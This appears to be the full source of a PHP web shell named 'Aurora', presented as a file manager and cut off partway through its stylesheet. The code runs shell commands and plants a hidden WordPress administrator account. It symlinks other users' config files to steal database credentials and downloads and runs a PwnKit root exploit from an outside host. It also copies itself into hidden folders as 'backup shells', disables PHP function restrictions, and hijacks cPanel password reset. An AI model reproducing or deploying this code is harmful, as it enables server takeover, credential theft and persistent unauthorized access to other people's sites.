<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
date_default_timezone_set('UTC');
const APP_NAME        = 'Aurora';
const APP_VERSION     = '2';
const UPDATE_URL      = 'http://aurora-fm.xyz/update.php';
const SCAN_READ_LIMIT = 5000;
$current_version = '2';
if (version_compare(PHP_VERSION, '5.4.0', '<')) {
    die('PHP version 5.4 or higher required');
}

$required_extensions = ['mysqli', 'curl', 'json'];
foreach ($required_extensions as $ext) {
    if (!extension_loaded($ext)) {
        die("Required PHP extension '{$ext}' is not loaded");
    }
}

header('Content-Type: text/html; charset=UTF-8');

if (ini_get('memory_limit') < 256) {
    @ini_set('memory_limit', '256M');
}
function customErrorHandler($errno, $errstr, $errfile, $errline) {
    if (!(error_reporting() & $errno)) {
        return false;
    }

    switch ($errno) {
        case E_ERROR:
        case E_CORE_ERROR:
        case E_COMPILE_ERROR:
        case E_PARSE:
            $error_type = 'Fatal Error';
            break;
        case E_WARNING:
        case E_CORE_WARNING:
        case E_COMPILE_WARNING:
        case E_USER_WARNING:
            $error_type = 'Warning';
            break;
        case E_NOTICE:
        case E_USER_NOTICE:
            $error_type = 'Notice';
            break;
        default:
            $error_type = 'Unknown';
            break;
    }

    error_log("PHP {$error_type}: {$errstr} in {$errfile} on line {$errline}");

    if ($errno == E_ERROR || $errno == E_CORE_ERROR || $errno == E_COMPILE_ERROR || $errno == E_PARSE) {
        die("A critical error occurred. Please check the error logs.");
    }

    return true;
}
set_error_handler("customErrorHandler");

$required_paths = [__DIR__, sys_get_temp_dir()];
foreach ($required_paths as $path) {
    if (!is_writable($path)) {
        die("Directory not writable: {$path}");
    }
}

if (!isset($_SESSION) && !headers_sent()) {
    session_start();
}



ini_set('max_execution_time', 30);
ini_set('memory_limit', '256M');
ini_set('realpath_cache_size', '4096k');
ini_set('realpath_cache_ttl', 600);

function checkUpdate() {
    return;
}
const SYMLINK_DIR     = 'AuroraSym';
const PERL_DIR        = 'perl';

function fmtSize($bytes) {
    static $types = ['B', 'KB', 'MB', 'GB', 'TB'];
    static $cache = [];

    $key = (string)$bytes;
    if (isset($cache[$key])) {
        return $cache[$key];
    }

    for ($i = 0; $bytes >= 1024 && $i < 4; $bytes /= 1024, $i++);
    $result = round($bytes, 2) . ' ' . $types[$i];
    $cache[$key] = $result;
    return $result;
}

function ext($file)
{
    return strtolower(pathinfo($file, PATHINFO_EXTENSION));
}

function icon($file) {
    static $iconCache = [];
    static $icons = [
        'php'  => '<i class="fa-brands fa-php text-indigo"></i>',
        'html' => '<i class="fa-brands fa-html5 text-danger"></i>',
        'css'  => '<i class="fa-brands fa-css3 text-primary"></i>',
        'js'   => '<i class="fa-brands fa-js text-warning"></i>',
        'py'   => '<i class="fa-brands fa-python text-warning"></i>',
        '.htaccess' => '<i class="fa-solid fa-lock text-danger"></i>',
        'image' => '<i class="fa-regular fa-image text-success"></i>',
        'default' => '<i class="fa-solid fa-file text-muted"></i>'
    ];

    if (isset($iconCache[$file])) {
        return $iconCache[$file];
    }

    if ($file === '.htaccess') {
        return $iconCache[$file] = $icons['.htaccess'];
    }

    $ext = ext($file);
    if (isset($icons[$ext])) {
        return $iconCache[$file] = $icons[$ext];
    }

    if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) {
        return $iconCache[$file] = $icons['image'];
    }

    return $iconCache[$file] = $icons['default'];
}

function enc($path)
{
    return base64_encode($path);
}

function dec($path)
{
    return base64_decode($path);
}

function perms($file)
{
    return substr(sprintf('%o', fileperms($file)), -4);
}

function suggest_exploit()
{
    $uname = php_uname();
    $parts = explode(" ", $uname);
    $kernel = isset($parts[2]) ? $parts[2] : '0.0.0';
    $version = explode("-", $kernel)[0];
    $numbers = explode(".", $version);
    $major = isset($numbers[0]) ? $numbers[0] : '0';
    $minor = isset($numbers[1]) ? $numbers[1] : '0';
    $patch = isset($numbers[2]) ? $numbers[2] : '0';
    return "$major.$minor.$patch";
}

function check_pwnkit_compatibility()
{
    $kernel = suggest_exploit();
    $compatible_versions = [
        '2.6.', '3.0.', '3.1.', '3.2.', '3.3.', '3.4.', '3.5.', '3.6.',
        '3.7.', '3.8.', '3.9.', '3.10.', '3.11.', '3.12.', '3.13.', '3.14.',
        '3.15.', '3.16.', '3.17.', '3.18.', '3.19.', '4.0.', '4.1.', '4.2.',
        '3.3.', '4.4.', '4.5.', '4.6.', '4.7.', '4.8.', '4.9.', '4.10.',
        '4.11.', '4.12.', '4.13.', '4.14.', '4.15.', '4.16.', '4.17.', '4.18.',
        '4.19.', '5.0.', '5.1.', '5.2.', '5.3.'
    ];
    foreach ($compatible_versions as $version) {
        if (strpos($kernel, $version) === 0) {
            return true;
        }
    }
    return false;
}

function cmd($command) {
    try {
        $output = '';
        // Sanitize command input
        $command = escapeshellcmd($command);

        // Check if command execution is allowed
        if (ini_get('safe_mode') || !function_exists('exec')) {
            throw new Exception('Command execution is disabled');
        }

        // Try different command execution methods
        if (function_exists('exec')) {
            exec($command . ' 2>&1', $output_array, $return_var);
            if ($return_var !== 0) {
                throw new Exception("Command failed with code: {$return_var}");
            }
            $output = implode("\n", $output_array);
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec($command . ' 2>&1');
            if ($output === null) {
                throw new Exception('Command execution failed');
            }
        } elseif (function_exists('system')) {
            ob_start();
            system($command . ' 2>&1', $return_var);
            $output = ob_get_clean();
            if ($return_var !== 0) {
                throw new Exception("Command failed with code: {$return_var}");
            }
        } else {
            throw new Exception('No command execution function available');
        }

        return $output;
    } catch (Exception $e) {
        error_log("Command execution error: " . $e->getMessage());
        return "Error: " . $e->getMessage();
    }
}


function addWordpressAdmin($dbHost, $dbUser, $dbPass, $dbName, $wpUser, $wpPass)
{
    try {
        $conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
        if ($conn->connect_error) return false;

        $hashedPass = password_hash($wpPass, PASSWORD_DEFAULT);
        $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) 
                VALUES (?, ?, ?, ?, NOW(), ?)";

        $stmt = $conn->prepare($sql);
        $stmt->bind_param("sssss", $wpUser, $hashedPass, $wpUser, "admin@local.host", $wpUser);

        if ($stmt->execute()) {
            $userId = $stmt->insert_id;
            $metaSql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)";
            $capabilities = serialize(array('administrator' => true));
            $metaStmt = $conn->prepare($metaSql);
            $metaStmt->bind_param("iss", $userId, "wp_capabilities", $capabilities);
            $metaStmt->execute();

            $levelSql = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, '10')";
            $levelStmt = $conn->prepare($levelSql);
            $levelStmt->bind_param("is", $userId, "wp_user_level");
            $levelStmt->execute();

            return true;
        }
        return false;
    } catch (Exception $e) {
        return false;
    }
}


function generatePhpIni()
{
    return file_put_contents(__DIR__ . DIRECTORY_SEPARATOR . 'php.ini', "disable_functions=none\n") !== false;
}

function initSymlinkContainer()
{
    if (!is_dir(SYMLINK_DIR)) mkdir(SYMLINK_DIR, 0777, true);
    $hta = SYMLINK_DIR . DIRECTORY_SEPARATOR . '.htaccess';
    if (!file_exists($hta)) {
        $rules = "Options +FollowSymLinks +Indexes\nOrder Allow,Deny\nAllow from all\nRequire all granted\n";
        file_put_contents($hta, $rules);
    }
    // Ensure proper permissions
    chmod(SYMLINK_DIR, 0755);
    if (file_exists($hta)) {
        chmod($hta, 0644);
    }
}

function createSymlink($src, $alias)
{
    $target = SYMLINK_DIR . DIRECTORY_SEPARATOR . $alias;
    if (!file_exists($target)) {
        @symlink($src, $target);
    }
}

function manualSymlink($src, $alias)
{
    initSymlinkContainer();
    createSymlink($src, $alias);
}

function extractSystemUsers()
{
    $users = [];
    $passwdFile = '/etc/passwd';
    if (file_exists($passwdFile) && is_readable($passwdFile)) {
        foreach (file($passwdFile) as $line) {
            $cols = explode(':', $line);
            if (count($cols) >= 3) {
                $name = $cols[0];
                $uid = (int)$cols[2];
                if ($uid >= 500) $users[] = $name;
            }
        }
    }
    return array_unique($users);
}

function massSymlinkConfigs($usernames)
{
    initSymlinkContainer();
    if (!file_exists(SYMLINK_DIR . DIRECTORY_SEPARATOR . 'root')) @symlink('/', SYMLINK_DIR . DIRECTORY_SEPARATOR . 'root');

    $patterns = [
        'wp-config'         => '/public_html/wp-config.php',
        'word-wp'           => '/public_html/wordpress/wp-config.php',
        'wpblog'            => '/public_html/blog/wp-config.php',
        'wp-old'            => '/public_html/wp/wp-config.php',
        'wp-backup'         => '/public_html/backup/wp-config.php',
        'wp-old2'           => '/public_html/old/wp-config.php',
        'wp-2020'           => '/public_html/2020/wp-config.php',
        'wp-2021'           => '/public_html/2021/wp-config.php',
        'wp-2022'           => '/public_html/2022/wp-config.php',
        'wp-2023'           => '/public_html/2023/wp-config.php',
        'wp-new'            => '/public_html/new/wp-config.php',
        'wp-dev'            => '/public_html/dev/wp-config.php',
        'wp-stage'          => '/public_html/staging/wp-config.php',
        'wp-test'           => '/public_html/test/wp-config.php',
        'joomla-or-whmcs'   => '/public_html/configuration.php',
        'joomla'            => '/public_html/joomla/configuration.php',
        'joomla-old'        => '/public_html/old/configuration.php',
        'joomla-backup'     => '/public_html/backup/configuration.php',
        'joomla-dev'        => '/public_html/dev/configuration.php',
        'vbinc'             => '/public_html/vb/includes/config.php',
        'vb'                => '/public_html/includes/config.php',
        'vb-old'            => '/public_html/old/includes/config.php',
        'vb-backup'         => '/public_html/backup/includes/config.php',
        'conf_global'       => '/public_html/conf_global.php',
        'inc'               => '/public_html/inc/config.php',
        'config'            => '/public_html/config.php',
        'Settings'          => '/public_html/Settings.php',
        'sites'             => '/public_html/sites/default/settings.php',
        'whm'               => '/public_html/whm/configuration.php',
        'whmcs'             => '/public_html/whmcs/configuration.php',
        'supportwhmcs'      => '/public_html/support/configuration.php',
        'WHM'               => '/public_html/whmc/WHM/configuration.php',
        'whmc'              => '/public_html/whm/WHMCS/configuration.php',
        'WHMcs'             => '/public_html/whm/whmcs/configuration.php',
        'whmcsupp'          => '/public_html/support/configuration.php',
        'whmcs-cli'         => '/public_html/clients/configuration.php',
        'whmcs-cl'          => '/public_html/client/configuration.php',
        'whmcs-CL'          => '/public_html/clientes/configuration.php',
        'whmcs-Cl'          => '/public_html/cliente/configuration.php',
        'whmcs-csup'        => '/public_html/clientsupport/configuration.php',
        'whmcs-bill'        => '/public_html/billing/configuration.php',
        'whmcs-old'         => '/public_html/old/configuration.php',
        'whmcs-backup'      => '/public_html/backup/configuration.php',

        'admin-conf'        => '/public_html/admin/config.php',
        'admin-old'         => '/public_html/admin/old/config.php',
        'admin-backup'      => '/public_html/admin/backup/config.php',

        'home1-wp'          => '/home1/public_html/wp-config.php',
        'home2-wp'          => '/home2/public_html/wp-config.php',
        'home3-wp'          => '/home3/public_html/wp-config.php',
        'home4-wp'          => '/home4/public_html/wp-config.php',
        'home5-wp'          => '/home5/public_html/wp-config.php',
        'html-wp'           => '/html/wp-config.php',
        'html-pub-wp'       => '/html/public/wp-config.php',
        'www-wp'            => '/www/wp-config.php',
        'www-pub-wp'        => '/www/public/wp-config.php'
    ];

    foreach ($usernames as $user) {
        $user = trim($user);
        if ($user === '') continue;
        foreach ($patterns as $postfix => $path) {
            createSymlink("/home/" . $user . $path, $user . ".." . $postfix);
        }
    }
}


$current_dir = dirname(__FILE__);
$path = isset($_GET['p']) ? dec($_GET['p']) : $current_dir;
if (!is_dir($path)) {
    $path = $current_dir;
}
define('PATH', $path);
$action = isset($_GET['act']) ? $_GET['act'] : 'list';
$target = isset($_GET['file']) ? $_GET['file'] : '';

if (isset($_POST['upload'])) {
    $dest = PATH . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}


$url1 = 'https://aurorafilemanager.github.io/Aurora.php';

function download_content($url) {
    try {
        // Validate URL
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            throw new Exception("Invalid URL format");
        }

        // Set timeout and user agent
        $ctx = stream_context_create([
            'http' => [
                'timeout' => 30,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'follow_location' => true
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);

        // Try file_get_contents first
        $content = @file_get_contents($url, false, $ctx);
        if ($content !== false) {
            return $content;
        }

        // Try cURL if file_get_contents fails
        if (function_exists('curl_init')) {
            $content = download_content_with_curl($url);
            if ($content !== false) {
                return $content;
            }
        }

        // Try fopen as last resort
        $content = download_content_with_fopen($url);
        if ($content !== false) {
            return $content;
        }

        throw new Exception("All download methods failed");
    } catch (Exception $e) {
        error_log("Download error: " . $e->getMessage());
        throw new Exception("Failed to download content: " . $e->getMessage());
    }
}

function download_content_with_curl($url) {
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception("Failed to initialize cURL");
        }

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);

        $content = curl_exec($ch);
        $error = curl_error($ch);
        $errno = curl_errno($ch);
        curl_close($ch);

        if ($content === false) {
            throw new Exception("cURL error ({$errno}): {$error}");
        }

        return $content;
    } catch (Exception $e) {
        error_log("cURL error: " . $e->getMessage());
        return false;
    }
}

function download_content_with_fopen($url) {
    try {
        $content = '';
        $handle = @fopen($url, 'r');

        if ($handle === false) {
            throw new Exception("Failed to open URL");
        }

        stream_set_timeout($handle, 30);

        while (!feof($handle)) {
            $chunk = fread($handle, 8192);
            if ($chunk === false) {
                throw new Exception("Failed to read from stream");
            }
            $content .= $chunk;
        }

        fclose($handle);

        if (empty($content)) {
            throw new Exception("No content received");
        }

        return $content;
    } catch (Exception $e) {
        error_log("fopen error: " . $e->getMessage());
        return false;
    }
}

// Remove duplicate function definitions

function get_full_url($filePath) {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
    $domainName = $_SERVER['HTTP_HOST'];
    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
    return $protocol . $domainName . $relativePath;
}

function create_files_in_subdirectories($rootDir, $url) {
    try {
        // Validate inputs
        if (!is_dir($rootDir)) {
            throw new Exception("Invalid root directory");
        }

        // Define common WordPress and system folders to create if they don't exist
        $folders_to_create = array(
            '.config',
            '.wp-content',
            '.wp-includes',
            '.wp-admin',
            '.system',
            '.tmp',
            '.cache',
            '.local'
        );

        // Create hidden folders if they don't exist
        foreach ($folders_to_create as $folder) {
            $folder_path = $rootDir . DIRECTORY_SEPARATOR . $folder;
            if (!file_exists($folder_path)) {
                if (@mkdir($folder_path, 0755, true)) {
                    // Set folder as hidden on Windows
                    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                        @system("attrib +h \"$folder_path\"");
                    }
                }
            }
        }

        // Get content first to avoid multiple downloads
        $content = download_content($url);
        if (!$content) {
            throw new Exception("Failed to download content from URL");
        }

        $created = false;
        // Include both existing and newly created directories
        $subdirs = array_merge(
            array_filter(glob($rootDir . '/*', GLOB_ONLYDIR)),
            array_filter(glob($rootDir . '/.*', GLOB_ONLYDIR))
        );

        foreach ($subdirs as $subdir) {
            if (!is_writable($subdir)) {
                continue;
            }

            $dirName = basename($subdir);
            $randomName = uniqid($dirName . '_', true);
            $extensions = array('.php', '.inc.php', '.ini.php', '_function.php');

            foreach ($extensions as $ext) {
                $filePath = $subdir . '/' . $randomName . $ext;

                if (!file_exists($filePath)) {
                    if (file_put_contents($filePath, $content) !== false) {
                        @chmod($filePath, 0644);
                        $fullUrl = get_full_url($filePath);
                        echo "<div class='alert alert-success'>Created: <a href='$fullUrl' target='_blank'>$fullUrl</a></div>";
                        $created = true;

                        // Create .htaccess to protect the file
                        $htaccess = $subdir . '/.htaccess';
                        if (!file_exists($htaccess)) {
                            $rules = "Options -Indexes\nOrder Allow,Deny\nAllow from all\n";
                            @file_put_contents($htaccess, $rules);
                        }

                        break; // Successfully created one file in this directory
                    }
                }
            }
        }

        if (!$created) {
            throw new Exception("Could not create any backup files. Check directory permissions.");
        }

        return true;

    } catch (Exception $e) {
        error_log("Backup creation error: " . $e->getMessage());
        echo "<div class='alert alert-danger'>Error: " . htmlspecialchars($e->getMessage()) . "</div>";
        return false;
    }
}




if (isset($_POST['newdir'])) {
    if (@mkdir(PATH . DIRECTORY_SEPARATOR . $_POST['dirname'], 0755)) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if (isset($_POST['newfile'])) {
    $file = PATH . DIRECTORY_SEPARATOR . $_POST['filename'];
    if (!file_exists($file) && file_put_contents($file, '') !== false) {
        header('Location: ?p=' . enc(PATH) . '&act=edit&file=' . urlencode($_POST['filename']));
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if (isset($_POST['save'])) {
    if (file_put_contents(PATH . DIRECTORY_SEPARATOR . $target, $_POST['content']) !== false) {
        header('Location: ?p=' . enc(PATH) . '&status=success');
    } else {
        header('Location: ?p=' . enc(PATH) . '&status=failed');
    }
    exit;
}

if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'auto-shell':
            $rootDir = $_SERVER['DOCUMENT_ROOT'];
            try {
                create_files_in_subdirectories($rootDir, $url1);
                echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                        <strong>Success!</strong> Backup shells have been created successfully.
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                      </div>';
            } catch (Exception $e) {
                echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                        <strong>Error!</strong> ' . htmlspecialchars($e->getMessage()) . '
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                      </div>';
            }
            break;

        case 'adminer':
            $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            if (@file_put_contents('adminer.php', @file_get_contents($url))) {
                header('Location: adminer.php');
            } else {
                header('Location: ?p=' . enc(PATH) . '&status=failed');
            }
            exit;

        case 'pwnkit':
            if (!file_exists('pwnkit')) {
                @file_put_contents('pwnkit', @file_get_contents('https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit'));
                @chmod('pwnkit', 0755);
                $output = @shell_exec('./pwnkit "id" 2>&1');
                file_put_contents('.root_output', $output);
            }
            header('Location: ?p=' . enc(PATH) . '&terminal=root');
            exit;

        case 'cpanel-reset':
            if (isset($_POST['email'])) {
                $path = dirname($_SERVER['DOCUMENT_ROOT']) . "/.cpanel/contactinfo";
                $content = json_encode(['email' => $_POST['email']]);
                if (@file_put_contents($path, $content)) {
                    header('Location: ' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1');
                    exit;
                }
            }
            break;

        case 'backdoor':
            $htaccess = '<FilesMatch "\.ph(p[3457]?|t|tml)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
<FilesMatch "^(' . basename($_SERVER['SCRIPT_FILENAME']) . '|index\.php)$">
    Order Allow,Deny
    Allow from all
</FilesMatch>';
            if (@file_put_contents('.htaccess', $htaccess)) {
                header('Location: ?p=' . enc(PATH) . '&status=success');
            } else {
                header('Location: ?p=' . enc(PATH) . '&status=failed');
            }
            exit;

        case 'mass-symlink':
            massSymlinkConfigs(extractSystemUsers());
            header('Location: ?p=' . enc(PATH) . '&status=success');
            exit;

        case 'phpini':
            generatePhpIni();
            header('Location: ?p=' . enc(PATH) . '&status=success');
            exit;
    }
}

// Handle download and delete
if ($action === 'download' && $target && is_file(PATH . DIRECTORY_SEPARATOR . $target)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($target) . '"');
    readfile(PATH . DIRECTORY_SEPARATOR . $target);
    exit;
}
if (isset($_GET['del'])) {
    $del = PATH . DIRECTORY_SEPARATOR . basename($_GET['del']);
    if (is_dir($del)) @rmdir($del);
    else @unlink($del);
    header('Location: ?p=' . enc(PATH));
    exit;
}

// Optimized directory listing with limited entries and caching
$dirs = $files = [];
if ($action === 'list') {
    static $dirCache = [];
    $cacheKey = md5(PATH);

    if (isset($dirCache[$cacheKey])) {
        list($dirs, $files) = $dirCache[$cacheKey];
    } else {
        $items = scandir(PATH);
        $count = 0;
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            if ($count >= SCAN_READ_LIMIT) break;

            $fullPath = PATH . DIRECTORY_SEPARATOR . $item;
            if (is_dir($fullPath)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
            $count++;
        }
        $dirCache[$cacheKey] = [$dirs, $files];

        // Limit cache size
        if (count($dirCache) > 10) {
            array_shift($dirCache);
        }
    }
}

// Handle hidden directory creation
if (isset($_POST['newhiddendir'])) {
    $hiddenDirName = '.' . trim($_POST['hiddendirname']);
    $hiddenDirPath = PATH . DIRECTORY_SEPARATOR . $hiddenDirName;
    if (!file_exists($hiddenDirPath)) {
        if (@mkdir($hiddenDirPath, 0755, true)) {
            header('Location: ?p=' . enc(PATH) . '&status=success');
        } else {
            header('Location: ?p=' . enc(PATH) . '&status=failed');
        }
    }
    exit;
}

// Check pwnkit compatibility
$is_compatible = check_pwnkit_compatibility();
$root_output = '';
if (isset($_GET['terminal']) && $_GET['terminal'] === 'root' && file_exists('.root_output')) {
    $root_output = file_get_contents('.root_output');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="dynamic-title"><?= APP_NAME ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script>
        // Animate title
        let titleText = document.getElementById("dynamic-title").innerHTML;
        let position = 0;

        setInterval(() => {
            position = (position + 1) % titleText.length;
            document.title = titleText.substring(position) + titleText.substring(0, position);
        }, 300);

        // Show time
        setInterval(() => {
            let now = new Date();
            let time = now.toLocaleTimeString();
            let date = now.toLocaleDateString();
            document.getElementById("current-time").innerHTML = time;
            document.getElementById("current-date").innerHTML = date;
        }, 1000);
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-bg: #0a0c0f;
            --secondary-bg: #12151a;
            --text-color: #e6edf3;
            --border-color: #21262d;
            --hover-color: #161b22;
            --link-color: #2f81f7;
            --success-color: #238636;
            --danger-color: #da3633;
            --warning-color: #9e6a03;
        }

        /* Enhanced overall styling */
        body {
            background: var(--primary-bg);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        /* Enhanced navbar */
        .navbar {
            background: linear-gradient(180deg, var(--secondary-bg), var(--primary-bg));
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            border-bottom: 1px solid var(--border-color);
        }

        /* Enhanced table styling */
        .table {
            background: var(--secondary-bg);
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            margin-bottom: 2rem;
        }

        .table thead th {
            background: var(--hover-color);
            border-bottom: 2px solid var(--border-color);
            color: var(--text-color);
            font-weight: 600;
            padding: 1rem;
        }

        .table tbody td {
            padding: 0.8rem 1rem;
            border-bottom: 1px solid var(--border-color);
            vertical-align: middle;
        }

        .table tbody tr:hover {
            background: var(--hover-color);
            transition: all 0.2s ease;
        }

        /* Enhanced buttons */
        .btn {
            border-radius: 6px;
            font-weight: 500;
            padding: 0.5rem 1rem;
            transition: all 0.2s ease;
        }

        .btn-primary {
            background: var(--link-color);
            border: none;
        }

        .btn-primary:hover {
            background: #388bfd;
            transform: translateY(-1px);
        }

        /* Enhanced modals */
        .modal-content {
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }

        .modal-header {
            border-bottom: 1px solid var(--border-color);
            padding: 1rem 1.5rem;
        }

        .modal-footer {
            border-top: 1px solid var(--border-color);
            padding: 1rem 1.5rem;
        }

        /* Enhanced form controls */
        .form-control {
            background: var(--primary-bg);
            border: 1px solid var(--border-color);
            color: var(--text-color);
            border-radius: 6px;
            padding: 0.6rem 1rem;
        }

        .form-control:focus {
            background: var(--primary-bg);
            border-color: var(--link-color);
            box-shadow: 0 0 0 3px rgba(47,129,247,0.2);
        }

        /* Enhanced alerts */
        .alert {
            background: var(--secondary-bg);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 1rem;
            margin-bottom: 1rem;
        }

        .alert-success {
            background: rgba(35,134,54,0.2);
            border-color: var(--success-color);
            color: #2ea043;
        }

        .alert-danger {
            background: rgba(218,54,51,0.2);
            border-color: var(--danger-color);
            color: #f85149;
        }

        /* Enhanced icons */
        .fa, .fas, .far, .fab {
            margin-right: 0.5rem;
        }

        /* Enhanced breadcrumb */
        .breadcrumb {
            background: linear-gradient(90deg, var(--secondary-bg), var(--hover-color));
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 0.8rem 1.2rem;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        .breadcrumb-item a {
            color: var(--link-color);
            font-weight: 500;
            text-decoration: none;
        }

        .breadcrumb-item.active {
            color: var(--text-color);
        }

        /* Enhanced footer */
        footer {
            background: linear-gradient(0deg, var(--secondary-bg), var(--primary-bg));
            border-top: 1px solid var(--border-color);
            padding: 2rem 0;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
        }

        footer a {
            color: var(--link-color);
            text-decoration: none;
            transition: all 0.2s ease;
        }

        footer a:hover {
            color: #388bfd;
            text-decoration: none;
        }

        /* Enhanced scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--primary-bg);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--hover-color);
        }
        
        body {
            background: var(--primary-bg);
            color: var(--text-color);
            font-family: 'Monaco', monospace;
        }
        
        .navbar {
            background: var(--secondary-bg);
            border-bottom: 1px solid var(--border-color);
        }
        
        .nav-link {
            color: var(--text-color) !important;
        }
        
        .nav-link:hover {
            color: var(--link-color) !important;
        }
        
        .table {
            color: var(--text-color);
        }
        
        .table > :not(caption) > * > * {
            background-color: var(--secondary-bg);
            border-bottom-color: var(--border-color);
            color: var(--text-color);
        }
        
        .table-hover tbody tr:hover {
            background-color: var(--hover-color);
        }
        
        .modal-content {
            background: var(--secondary-bg);
            color: var(--text-color);
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            border-bottom: 1px solid var(--border-color);
        }
        
        .modal-footer {
            border-top: 1px solid var(--border-color);
        }
        
        .form-control {
            background: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-control:focus {
            background: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
            box-shadow: 0 0 0 0.25rem rgba(88, 166, 255, 0.25);
        }
        
        .btn-close {
            filter: invert(1) grayscale(100%) brightness(200%);
        }
        
        a {
            color: var(--link-color);
            text-decoration: none;
        }
        
        a:hover {
            color: var(--link-color);
            text-decoration: underline;
        }
        
        .alert {
            background: var(--secondary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .alert-success {
            background: #238636;
            border-color: #2ea043;
        }
        
        .alert-danger {
            background: #da3633;
            border-color: #f85149;
        }
        
        .btn-outline-primary {
            color: var(--link-color);
            border-color: var(--link-color);
        }
        
        .btn-outline-primary:hover {
            background: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-outline-danger {
            color: #f85149;
            border-color: #f85149;
        }
        
        .btn-outline-danger:hover {
            background: #da3633;
            border-color: #f85149;
            color: var(--text-color);
        }
        
        .breadcrumb {
            background: var(--secondary-bg);
            padding: 0.75rem 1rem;
            border-radius: 0.25rem;
            margin-bottom: 1rem;
        }
        
        .breadcrumb-item + .breadcrumb-item::before {
            color: var(--text-color);
        }
        
        .breadcrumb-item.active {
            color: var(--text-color);
        }
        
        .form-select {
            background-color: var(--primary-bg);
            border-color: var(--border-color);
            color: var(--text-color);
        }
        
        .form-select:focus {
            background-color: var(--primary-bg);
            border-color: var(--link-color);
            color: var(--text-color);
        }
        
        .btn {
            padding: 0.375rem 0.75rem;
            border-radius: 0.25rem;
            transition: all 0.15s ease-in-out;
        }
        
        .btn-primary {
            background-color: var(--link-color);
            border-color: var(--link-color);
            color: var(--primary-bg);
        }
        
        .btn-primary:hover {
            background-color: #4a8ddb;
            border-color: #4a8ddb;
        }
        
        .btn-secondary {
            background-color: #30363d;
            border-color: #30363d;
            color: var(--text-color);
        }
        
        .btn-secondary:hover {
            background-color: #3c444d;
            border-color: #3c444d;
        }
        
        .terminal {
            background: #1c2128;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 1rem;
            margin: 1rem 0;
            font-family: monospace;
            white-space: pre-wrap;
            color: #7ee787;
        }
        
        .compatibility-info {
            padding: 1rem;
            margin: 1rem 0;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
